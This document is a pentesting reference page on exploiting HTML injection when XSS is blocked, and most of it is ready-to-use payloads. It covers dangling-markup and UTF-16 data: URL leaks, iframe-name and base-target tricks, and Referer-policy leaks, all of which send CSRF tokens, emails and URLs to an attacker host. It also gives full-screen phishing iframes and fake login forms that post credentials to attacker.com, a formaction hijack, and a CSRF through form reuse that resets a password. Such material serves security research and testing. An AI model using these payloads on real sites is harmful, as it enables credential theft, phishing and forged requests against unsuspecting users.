---
description: Tricks possible with malicious HTML, in case XSS is not quite possible
---

# HTML Injection

## # Related Pages

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Dangling Markup

The idea of [Dangling Markup](https://lcamtuf.coredump.cx/postxss/) is to write incomplete HTML that slots sensitive information into some leakable field, such as an `<img src=`. By starting it with a `'` but not ending it, any other HTML will be appended to it, finally being close by a natural `'` anywhere below the injection point.

{% code title="Payload" %}
```html
<img src='//attacker-website.com?
```
{% endcode %}

{% code title="HTML Source" %}
```html
<img src='https://attacker.com?</div>
<input type="hidden" name="csrf" value="1337">
</form>
<p>I'm hacked? Oh no!</p>
```
{% endcode %}

This results in an image request to the following URL, which the attacker can decode to get the value of the sensitive CSRF token:

[https://attacker.com/?%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%221337%22%3E%3C/form%3E%3Cp%3EI](https://attacker.com/?%3C/div%3E%3Cinput%20type=%22hidden%22%20name=%22csrf%22%20value=%221337%22%3E%3C/form%3E%3Cp%3EI)

You may also find a scenario where there is no double or single quote after the data you want to leak, but if the data you seek is close enough (eg. without   or `>` in between), you could leak it _without quotes at all_. Below is an example where sensitive data is appended to your input:

{% code title="HTML Source" %}
```html
<img src=https://attacker.com?SECRET_DATA
<p>Some more text</p>
```
{% endcode %}

One annoying thing to work with is that Chromium denies any URLs (or `target` values) containing newlines. If the leaked content contains any newlines, as is pretty common for HTML, the attacker cannot receive a request. Minifiers will sometimes remove newlines as they are unnecessary, but more often than not, you will have to deal with this. Firefox still allows newlines in URLs, though, so you're not left without impact.

Another idea is to use `<textarea>`, as it will only be closed by the `</textarea>` string, or at the end of the document. You can then wrap this in a form to an attacker with a large submit button that leaks the value on click:

{% code title="HTML Source" %}
```html
<form action="https://attacker.com">
<button type="submit" style="position: fixed; z-index: 999999; top: 0; left: 0;
                             width: 100vw; height: 100vh; opacity: 0"></button>
<textarea name="leak">
<p>Your email: victim@example.com</p>
```
{% endcode %}

While this too works on Firefox, Chromium has a protection against this. There needs to be a natural `</textarea>` somewhere after your injection point.

<figure><img src="../../../.gitbook/assets/image (67).png" alt="" width="563"><figcaption><p>Chromium denying an implicitly closed <code>&#x3C;textarea></code></p></figcaption></figure>

{% hint style="info" %}
**Note**: in case your HTML is _parsed and serialized_ before being shown, it is hard to dangle half-open syntax. You may be able to exploit [#mutation-xss-and-dompurify](./#mutation-xss-and-dompurify "mention") to confuse the parser and make it think your input is inside a `<style>` tag (CSS). Their text content is seen as raw and isn't altered. In the browser, however, due to some namespace confusion or other mutation it is seen as regular HTML and the tag is dangled.

```html
<style><img src='https://attacker.com?
```
{% endhint %}

### Bypass newline detection

Ideas taken from here:\
[https://nzt-48.org/slides/how-to-bypass-the-Content-Security-Policy.pdf](https://nzt-48.org/slides/how-to-bypass-the-Content-Security-Policy.pdf)

#### UTF-16 iframe/stylesheet content

One very creative idea to bypass this restriction without scripts is if `<iframe>` tags are allowed with a `src=data:`. If this is the case, you can start a document with a UTF-16 charset and start a URL from there. The content after it will still be included in the `src=`, but is decoded as UTF-16, creating random chinese characters. The URL will then contain these high unicode characters instead of newlines, so they are allowed.

We'll use a great leak method that **automatically closes itself at the end of the document**:

{% code title="Encoded prefix" %}
```html
<style>*{background-image: url(https://attacker.com?
```
{% endcode %}

This is now [encoded as UTF-16](https://gchq.github.io/CyberChef/#recipe=Encode_text\('UTF-16LE%20\(1200\)'\)URL_Encode\(true\)\&input=PHN0eWxlPip7YmFja2dyb3VuZC1pbWFnZTogdXJsKGh0dHBzOi8vYXR0YWNrZXIuY29tPw), and put into an iframe `data:` URL:

<pre class="language-html" data-title="Payload" data-overflow="wrap"><code class="lang-html"><strong>&#x3C;iframe src='data:text/html;charset=utf-16,%3C%00s%00t%00y%00l%00e%00%3E%00%2A%00%7B%00b%00a%00c%00k%00g%00r%00o%00u%00n%00d%00%2D%00i%00m%00a%00g%00e%00%3A%00%20%00u%00r%00l%00%28%00h%00t%00t%00p%00s%00%3A%00%2F%00%2F%00a%00t%00t%00a%00c%00k%00e%00r%00%2E%00c%00o%00m%00%3F%00
</strong></code></pre>

Any leak-worthy content can now be added to the end, until a `'` closes it off:

<pre class="language-html" data-title="HTML Source" data-overflow="wrap"><code class="lang-html">&#x3C;iframe src='data:text/html;charset=utf-16,%3C%00s%00t%00y%00l%00e%00%3E%00%2A%00%7B%00b%00a%00c%00k%00g%00r%00o%00u%00n%00d%00%2D%00i%00m%00a%00g%00e%00%3A%00%20%00u%00r%00l%00%28%00h%00t%00t%00p%00s%00%3A%00%2F%00%2F%00a%00t%00t%00a%00c%00k%00e%00r%00%2E%00c%00o%00m%00%3F%00
<strong>&#x3C;p>Your email: victim@example.com&#x3C;/p>
</strong>&#x3C;footer>That's all folks!&#x3C;/footer>
</code></pre>

In the browser, the content inside the iframe now looks like our injected prefix, with some random characters after it. This causes the background image request to be sent:

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption><p>Iframe loads with UTF-16 decoded content, sensitive data turned into chinese</p></figcaption></figure>

[https://attacker.com/?%E3%B0%8A%E3%B9%B0%E6%BD%99%E7%89%B5%E6%94%A0%E6%85%AD%E6%B1%A9%E2%80%BA%E6%A5%B6%E7%91%A3%E6%B5%A9%E6%95%80%E6%85%B8%E7%81%AD%E6%95%AC%E6%8C%AE%E6%B5%AF%E2%BC%BC%E3%B9%B0%E3%B0%8A%E6%BD%A6%E7%91%AF%E7%89%A5%E5%90%BE%E6%85%A8](https://attacker.com/?%E3%B0%8A%E3%B9%B0%E6%BD%99%E7%89%B5%E6%94%A0%E6%85%AD%E6%B1%A9%E2%80%BA%E6%A5%B6%E7%91%A3%E6%B5%A9%E6%95%80%E6%85%B8%E7%81%AD%E6%95%AC%E6%8C%AE%E6%B5%AF%E2%BC%BC%E3%B9%B0%E3%B0%8A%E6%BD%A6%E7%91%AF%E7%89%A5%E5%90%BE%E6%85%A8)

The above leak can be decoded back into the original characters by reading the UTF-16 characters as bytes. This is easily done in Python:

{% code title="Decode leak" %}
```python
from urllib.parse import unquote
leak = "%E3%B0%8A%E3%B9%B0%E6%BD%99%E7%89%B5%E6%94%A0%E6%85%AD%E6%B1%A9%E2%80%BA%E6%A5%B6%E7%91%A3%E6%B5%A9%E6%95%80%E6%85%B8%E7%81%AD%E6%95%AC%E6%8C%AE%E6%B5%AF%E2%BC%BC%E3%B9%B0%E3%B0%8A%E6%BD%A6%E7%91%AF%E7%89%A5%E5%90%BE%E6%85%A8"
print(unquote(leak).encode('utf-16-le').decode("utf-8"))
# b'\n<p>Your email: victim@example.com</p>\n<footer>Tha'
```
{% endcode %}

The same can be done by loading a **stylesheet** from `data:` like this ([encode](https://gchq.github.io/CyberChef/#recipe=Encode_text\('UTF-16LE%20\(1200\)'\)URL_Encode\(true\)\&input=KntiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaHR0cHM6Ly9hdHRhY2tlci5jb20/)):

{% code title="Encoded prefix" %}
```css
*{background-image: url(https://attacker.com?
```
{% endcode %}

{% code title="Payload" overflow="wrap" %}
```html
<link rel="stylesheet" href='data:text/css;charset=utf-16,%2A%00%7B%00b%00a%00c%00k%00g%00r%00o%00u%00n%00d%00%2D%00i%00m%00a%00g%00e%00%3A%00%20%00u%00r%00l%00%28%00h%00t%00t%00p%00s%00%3A%00%2F%00%2F%00a%00t%00t%00a%00c%00k%00e%00r%00%2E%00c%00o%00m%00%3F%00
```
{% endcode %}

Although note that at this point, you are likely able to leak content through [css-injection.md](../css-injection.md "mention") as well.

#### Iframe name attribute

When you are able to create an iframe with a remote source, the `name=` attribute is leakable cross-origin by reading the `window.name` variable as the attacker. This may include newlines, even on Chromium, because it is not a URL or target:

{% code title="HTML Source" %}
```html
<iframe src="https://attacker.com" name='
<p>Your email: victim@example.com</p>
<footer>That's all folks!</footer>
```
{% endcode %}

{% code title="Attacker Console" %}
```javascript
> window.name
'\n<p>Your email: victim@example.com</p>\n<footer>That'
```
{% endcode %}

This same attack works with `<object data=>` and `<embed src=>` tags too, which may have a more allowing CSP.

If the CSP doesn't allow any attacker's sources, but the page is iframable, we can take a trick from the [#nested-iframe](postmessage-exploitation.md#nested-iframe "mention") postMessage exploits by using `about:blank` and hijacking the iframe to read its name. This works because the name property is preserved across navigations.

{% embed url="https://portswigger.net/research/bypassing-csp-with-dangling-iframes" %}
Article explaining this trick of stealing the name with nested iframes
{% endembed %}

{% code title="Injection" %}
```html
<object data="about:blank" name='
```
{% endcode %}

<pre class="language-html" data-title="Exploit"><code class="lang-html">&#x3C;iframe id="iframe" src="https://target.tld/dangling-object">&#x3C;/iframe>
&#x3C;script>
  iframe.onload = () => {
    const object = iframe.contentWindow[0];
    object.location = "about:blank";  // Navigate to our same-origin

    const interval = setInterval(() => {
      object.origin;  // When it becomes same-origin
      clearInterval(interval);
<strong>      alert(object.name);  // Leak its name (kept after navigation)
</strong>    })
  }
&#x3C;/script>
</code></pre>

***

Another related trick relies on the [`<base>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/base) tag and its `target=` attribute. By clobbering it, every link on the page that the user may click (including ones by the attacker) will get their name set to the attribute value. This also supports newlines still and allows you to leak just as before, without iframes but requiring a click on the attacker's link inside the target page. Using CSS or classes you may be able to cover the whole screen.

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}
Article first explaining this technique with examples
{% endembed %}

{% code title="Injection" %}
```html
<a href="https://attacker.com/leak" style="position:fixed;top:0;left:0;width:100%;height:100%"></a>
<base target='
```
{% endcode %}

{% code title="https://attacker.com/leak" %}
```javascript
alert(window.name)  // Leak
```
{% endcode %}

### Leak via Referer

This next trick is for leaking with `<textarea>` using a form, while the [`form-action`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/form-action) CSP directive disallows external hosts. It only works in Chromium, so this requires a natural `</textarea>` after the injection point and the sensitive data.

Using the following injection, it is possible to leak the current URL via the [#referer](html-injection.md#referer "mention") request header:

{% code title="Referer leak" %}
```html
<img src="https://attacker.com" referrerpolicy="unsafe-url">
```
{% endcode %}

It will include all query parameters, and we can put sensitive dangled information in there by making a form with a GET method first:

<pre class="language-html" data-title="HTML Source"><code class="lang-html"><strong>&#x3C;form action="/referer-leak" method="GET">
</strong><strong>&#x3C;button type="submit" style="position: fixed; z-index: 999999; top: 0; left: 0;
</strong><strong>                             width: 100vw; height: 100vh; opacity: 0">&#x3C;/button>
</strong><strong>&#x3C;textarea name="leak">
</strong>&#x3C;p>Your email: victim@example.com&#x3C;/p>
&#x3C;div class="note">
  &#x3C;textarea>&#x3C;/textarea>
&#x3C;/div>
</code></pre>

This `action=` points to the location where the second referer-leaking HTML injection is stored. After clicking anywhere, the form submits and the value of the textarea is put into the `?leak=` query parameter. This allows it to be leaked by the referer payload:

<figure><img src="../../../.gitbook/assets/image (69).png" alt="" width="563"><figcaption><p>Step 1: Prepare form that puts sensitive data in query parameter + large submit button</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70).png" alt="" width="563"><figcaption><p>Step 2: After submitting, leak is in URL and victim is brought to referer leak</p></figcaption></figure>

This will trigger the following request, that the attacker can decode to find the leaked information:

{% code overflow="wrap" %}
```http
GET / HTTP/1.1
Host: attacker.com
Referer: https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E
```
{% endcode %}

If the HTML-injection is _reflected with a_ _GET parameter_, you can elegantly include this parameter in the form submission to the vulnerable endpoint:

<pre class="language-html" data-title="HTML Source"><code class="lang-html">&#x3C;form action="" method="GET">
<strong>&#x3C;input type="hidden" name="html" value="&#x3C;img src=https://attacker.com referrerpolicy=unsafe-url>">
</strong>&#x3C;button type="submit" style="position: fixed; z-index: 999999; top: 0; left: 0;
                             width: 100vw; height: 100vh; opacity: 0">&#x3C;/button>
&#x3C;textarea name="leak">
&#x3C;p>Your email: victim@example.com&#x3C;/p>
&#x3C;div class="note">
  &#x3C;textarea>&#x3C;/textarea>
&#x3C;/div>
</code></pre>

It will redirect the victim to the current path with query parameters like:

[https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E\&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E](https://target.com/vulnerable?html=%3Cimg+src%3Dhttps%3A%2F%2Fattacker.com+referrerpolicy%3Dunsafe-url%3E\&leak=%3Cp%3EYour+email%3A+victim%40example.com%3C%2Fp%3E%0D%0A%3Cdiv+class%3D%22write-note%22%3E%0D%0A++%3Ctextarea%3E)

Then, the same as with the stored example happens, the injected referer payload leaks the current URL with `&leak=`, and the attacker can decode it from their server logs.

## CSS Injection

If you can inject `<style>` tags, check out the following page on how to abuse that to leak other content on the page through selectors and fonts:

{% content-ref url="../css-injection.md" %}
[css-injection.md](../css-injection.md)
{% endcontent-ref %}

In case you can only set the `style=` attribute, you cannot work with selectors or define fonts. This limits your abilities, but still allows two main ideas:

1. Set specific styles to full-screen any element you want, like an image to phish the user with a message and QR code, or even an iframe as explained in [#iframes](html-injection.md#iframes "mention").
2. Use `background-image: url(...)` to trigger a subresource request that can return a malicious `Link:` header as explained in [#link-response-header-with-preload-chrome-less-than-136](html-injection.md#link-response-header-with-preload-chrome-less-than-136 "mention").

## Redirect

One powerful HTML tag that can't even be mitigated by a CSP is the `<meta>` tag:

```html
<meta http-equiv="refresh" content="0; url=https://example.com">
```

With this `http-equiv=` value it acts as the [`Refresh:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Refresh) header, redirecting the document to a new URL after some number of seconds (0 in this case). It's a great way to get a victim to your attacker's page, either for phishing or to initiate another attack that requires you to have more control over the browser, such as CSRF or a complex XSS.

This is especially useful in [headless-browsers.md](../headless-browsers.md "mention") where most of the time it's supposed to be locked to one specific trusted site, but may be able to be redirected to an unsafe one that can, for example, pwn an outdated version.

## Referer

The [`Referer:`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer) request header is sent by default for every request, containing the **url the request was sent from**. It means that something as simple as clicking a link going to an attacker from a target's domain, will leak the target's domain on which the link was clicked to the attacker.\
Well, that's how it _used to work_. Nowadays the defaults are more sensible, only sending the _origin_ of the target instead of the full path and query parameters. This is controlled by the [`Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy).

{% hint style="info" %}
**Fun fact**: The name "referer" is actually a misspelling that made it irrecoverably deep into the specification. it leaves us with the situation where some references to it as spelled as "referer", while others say "referrer".
{% endhint %}

Query parameters can be very sensitive in situations like the ["OAuth dirty dance"](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/) technique, where you place the authorization code on a URL without using it, then leak it to use for yourself. Leakage through the `Referer:` header still has potential if you are able to **alter the referrer policy**.

The most straight-forward way would be to use a [crlf-header-injection.md](../crlf-header-injection.md "mention") to set it as a header:

```http
Referrer-Policy: unsafe-url
```

This situation is unlikely though, something more common is the ability to insert limited HTML on a page. You can use this to alter the referrer policy using a [`<meta>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta) tag:

```html
<meta name="referrer" content="unsafe-url">
```

You'd now need to load any resource from an attacker's domain (like an `<img>`), and the whole current URL with parameters is sent to the attacker.\
When the CSP is in the way, a `<meta http-equiv="Refresh">` cannot be blocked:

<pre class="language-http" data-title="Redirecting response"><code class="lang-http">HTTP/1.1 200 OK
<strong>Content-Security-Policy: default-src 'none'
</strong>Content-Type: text/html

&#x3C;meta name="referrer" content="unsafe-url">
<strong>&#x3C;meta http-equiv="Refresh" content="0,url=https://example.com">
</strong></code></pre>

{% hint style="success" %}
Interestingly, the `<meta>` tag applies to the whole page, even during [`DOMParser.parseFromString()`](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser/parseFromString) (without inserting into the DOM, [only on Chromium](https://issues.chromium.org/issues/40698594)). This means client-side sanitizers that use this parsing function will accidentally apply the referrer policy before it can be sanitized!

It allows a very simple way to leak the current URL through DOMPurify:

<pre class="language-html"><code class="lang-html"><strong>&#x3C;meta name="referrer" content="unsafe-url">
</strong>&#x3C;!-- Even though the above is sanitized away, it still applies to image that is left over -->
<strong>&#x3C;img src="https://attacker.com">
</strong></code></pre>
{% endhint %}

#### Attribute Injection

Individual elements can also be altered using the `referrerpolicy=` attribute. This is useful if you have an attacker-controlled resource:

```html
<img src="http://attacker.com" referrerpolicy="unsafe-url">
```

{% hint style="warning" %}
The `<meta>` tag and `referrerpolicy=` methods don't work on Firefox, as it denies less restricted policies via HTML for cross-site requests. Unless you are able to retrieve the Referer header from a same-site in any way, of course.
{% endhint %}

For more elements that request a certain URL and that you may control to send a referer to, check out the repository below with all known ways:

{% embed url="https://github.com/cure53/HTTPLeaks/blob/main/leak.html" %}
All known ways to send HTTP requests using markup
{% endembed %}

When cross-site connections to your attacker's server aren't allowed by a CSP, for example, you may be able to use an `<iframe>` with a `srcdoc=` or `src=data:`. This allows you to provide an inline document that will handle the request, and can read `document.referrer`.

<pre class="language-html" data-title="Examples" data-overflow="wrap"><code class="lang-html">&#x3C;!-- If you are able to inject this, you'll be same-origin with the parent anyway -->
<strong>&#x3C;iframe srcdoc="&#x3C;script>alert(document.referrer)&#x3C;/script>" referrerpolicy="unsafe-url">&#x3C;/iframe>
</strong>
&#x3C;!-- Even though data: normally gets a 'null' origin, it can still read referrer -->
<strong>&#x3C;iframe src="data:text/html,&#x3C;script>alert(document.referrer)&#x3C;/script>" referrerpolicy="unsafe-url">&#x3C;/iframe>
</strong></code></pre>

#### Link response header with preload (Chrome < 136)

This next trick was a Chrome bug shared by [@slonser 🐘](https://x.com/slonser_/status/1919439373986107814) _fixed in version 136_.\
The referrer policy for a preload request that you give in a `Link:` response header to any subresource that goes to your server, will be applied to the current documentt.

What this means is that all you need is for the target to load an `<img>` that points to your server, and you can return the following response header:

```http
Link: </leak>; rel=preload; as=image; referrerpolicy=unsafe-url
```

<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption><p>Exploit leaking referer from <a href="https://r.jtw.sh/">r.jtw.sh</a> image</p></figcaption></figure>

Above you can see an image being loaded cross-origin that responds with the mentioned `Link:` header. In the `/leak` requests that the preload asks for, the unsafe `referrerpolicy=` will be applied!

This works for **any subresource request** to an attacker's domain, including things like stylesheet `@import` or `@font-face` if the CSP blocks images.

<pre class="language-html"><code class="lang-html">&#x3C;style>
<strong>@import "https://attacker.com/link";  /* Required to be at the start of style tag */
</strong>
@font-face {
  font-family: "leak";
<strong>  src: url(https://attacker.com/link);  /* Works from anywhere */
</strong>}
* {
  font-family: leak;
}
&#x3C;/style>
</code></pre>

## DOM Clobbering

One idea is to use **DOM Clobbering**, which is a technique that uses `id`'s and other attributes of tags that make them accessible from JavaScript with the `document.<name>` syntax. The possibility of this depends on what sinks are available, and should be evaluated case-by-case:

{% embed url="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering" %}
A simple reference with examples and tricks about DOM Clobbering ([more detail](https://domclob.xyz/))
{% endembed %}

{% embed url="https://tib3rius.com/dom/" %}
Cheat sheet on DOM Clobbering payload for various types of properties
{% endembed %}

This can commonly be used to **overwrite existing functions** and crash them, or **pollute element properties** during HTML sanitization ([example of `parentNode`](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dom-Clobbering-issue) & [example of `attributes`](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)).

## Phishing

HTML is markup, so you can often use this to gain control over the page you are attacking in order to phish any users coming across it.

### Iframes

Combining an `<iframe>` with `<style>`, you can create a full-screen phishing page on the target domain, that may fool any user coming across it as the domain seems correct.

{% code title="Phishing " %}
```html
<iframe src="https://attacker.com"></iframe>
<style>
/* Make it take over the full screen, while still keeping a trusted address bar */
iframe {
    width: 100vw;
    height: 100vh;
    position: fixed;
    top: 0;
    left: 0;
    border: none;
}
</style>
```
{% endcode %}

Having your site iframes on a target also gives you a reference to it via `top`. Firstly, you can redirect the top-level page by setting its `location =`:

<pre class="language-html" data-title="Inside attacker&#x27;s frame"><code class="lang-html">&#x3C;script>
<strong>  top.location = "https://attacker-phishing.com"
</strong>&#x3C;/script>
</code></pre>

If your injection is stored, it can be pretty convincing to suddenly be brought to a phishing page of the same application while browsing said application.

It also allows you to trigger [`.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) handlers for all kinds of exploitation. Read more details on the page below:

{% content-ref url="postmessage-exploitation.md" %}
[postmessage-exploitation.md](postmessage-exploitation.md)
{% endcontent-ref %}

### Forms

The previous phishing example is less likely to work on victims using a password manager, because the iframe is hosted on a different domain, it won't auto-complete like the user might be expecting. This can be improved by creating the phishing page natively inside your injection point.

Simply create a form with some inputs and a bunch of CSS (tip: re-use existing classes), recreating the real login page as closely as possible. But importantly, change the `action=` to your attacker's domain in order to receive the credentials. It may look something like this:

<pre class="language-html" data-title="Replace page with form"><code class="lang-html">&#x3C;div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            z-index: 999999; background: white">
  &#x3C;div class="d-flex flex-column h-100 justify-content-center align-items-center">
    &#x3C;h1>Login&#x3C;/h1>
<strong>    &#x3C;form action="https://attacker.com">
</strong>      &#x3C;input class="form-control" type="text" name="username" placeholder="Username..." autofocus>
      &#x3C;input class="form-control" type="text" name="password" placeholder="Password...">
      &#x3C;button class="btn btn-primary" type="submit">Submit&#x3C;/button>
    &#x3C;/form>
  &#x3C;/div>
&#x3C;/div>
</code></pre>

{% hint style="success" %}
Because this HTML is hosted on the target directly, password managers with auto-fill functionality will not know the difference between this and the real thing!

![](<../../../.gitbook/assets/image (6) (1) (1).png>)
{% endhint %}

Apart from leaking form inputs, you can also use forms to send specific requests form a trusted source. This can bypass checks like `SameSite=` cookies, the `Origin:` header or even CSRF tokens if JavaScript automatically adds them to any form on the page.

#### Rewrite form action from `<input>`

In rare cases it is possible to **hijack existing forms** to do what you want. For example, take the following source code and injection point, where we're able to add arguments:

<pre class="language-html"><code class="lang-html"><strong>&#x3C;form action="/login" method="post">
</strong>  &#x3C;input type="text" name="username">
  &#x3C;input type="text" name="password">
<strong>  &#x3C;button type="submit" class="INJECTION_HERE">Submit&#x3C;/button>
</strong>&#x3C;/form>
</code></pre>

An injection like `" formaction="https://attacker.com` would cause pressing the button to send credentials to `attacker.com` instead:

{% code title="Exploit" %}
```html
<button type="submit" class="" formaction="https://attacker.com">Submit</button>
```
{% endcode %}

#### CSRF form re-use

Another trick is to use the `form=` attribute to attach an `<input>` outside of any form to the form with that `id=`. If that **already has a CSRF token**, you can **add any values to it**, which will be trusted when submitting. To get more use out of it, you can add another button with relative `formaction=` that rewrites the destination, while retaining the CSRF token from the other form.

This effectively creates a perfect CSRF:

<pre class="language-html" data-title="Exploit"><code class="lang-html">&#x3C;form id="search-form" action="/search" method="post">
<strong>  &#x3C;input type="text" name="csrf" value="1337">
</strong>  &#x3C;input type="hidden" name="query" value="">
  &#x3C;button type="submit">Search&#x3C;/button>
&#x3C;/form>
&#x3C;!-- Injection: -->
<strong>&#x3C;input form="search-form" type="text" name="password" value="hacked">
</strong><strong>&#x3C;button form="search-form" formaction="/reset_password" type="submit" 
</strong><strong>        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
</strong><strong>               z-index: 999999; opacity: 0">&#x3C;/button>
</strong></code></pre>

When clicking anywhere on the page, this sends a request like the following:

<pre class="language-http"><code class="lang-http"><strong>POST /reset_password HTTP/1.1
</strong>Host: target.com
Origin: https://target.com
Content-Type: application/x-www-form-urlencoded

<strong>csrf=1337&#x26;query=&#x26;password=hacked
</strong></code></pre>

{% hint style="info" %}
**Tip**: Some other useful attributes for the submit button are:

* [`formnovalidate=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button#formnovalidate) to ignore validation rules, useful if the original form wasn't filled out completely.
* [`formmethod=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button#formmethod) to change the method from GET to POST, for example.
* [`formenctype=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button#formenctype) to use `multipart/form-data` or `text/plain` if needed. Unfortunately, still hard to create a valid JSON body with this.
* [`formtarget=`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/button#formtarget) to redirect not the current top-level window, but an iframe with this `id=`, to hide the response of the form submission to the victim.
{% endhint %}

Check out the page below for more details on exploitation of CSRF:

{% content-ref url="../cross-site-request-forgery-csrf.md" %}
[cross-site-request-forgery-csrf.md](../cross-site-request-forgery-csrf.md)
{% endcontent-ref %}
